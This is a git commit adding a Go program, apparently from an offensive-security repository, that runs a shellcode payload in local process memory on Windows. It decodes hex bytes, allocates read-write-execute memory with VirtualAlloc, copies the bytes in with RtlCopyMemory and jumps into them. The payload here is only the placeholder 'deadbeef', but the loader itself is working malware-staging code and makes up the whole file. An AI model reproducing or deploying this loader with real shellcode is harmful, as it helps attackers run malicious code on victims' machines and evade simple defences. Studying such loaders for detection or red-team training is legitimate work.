5eaa238f726658c1c05139556a3296516aa4f32d
KrknSec <paul.daubman@mymail.champlain.edu>
2023-10-15 14:34:39 -0400

    Create LocalPayloadExecution.go

---
+++ Local Payload Execution/Golang/LocalPayloadExecution.go
@@ -0,0 +1,45 @@
+package main
+
+import (
+	"encoding/hex"
+	"fmt"
+	"syscall"
+	"unsafe"
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+	kernel32            = syscall.NewLazyDLL("kernel32.dll")
+	ntdll               = syscall.NewLazyDLL("ntdll.dll")
+	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
+	VirtualProtect      = kernel32.NewProc("VirtualProtect")
+	CreateThread        = kernel32.NewProc("CreateThread")
+	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
+	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
+)
+
+func main() {
+
+	data, err := hex.DecodeString("deadbeef")
+
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(data)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		fmt.Println(err.Error())
+	}
+
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
+	if err != nil {
+		fmt.Println(err.Error())
+	}
+
+	_, _, err = syscall.SyscallN(addr, 0, 0, 0, 0)
+	if err != nil {
+		fmt.Println(err.Error())
+	}
+
+}
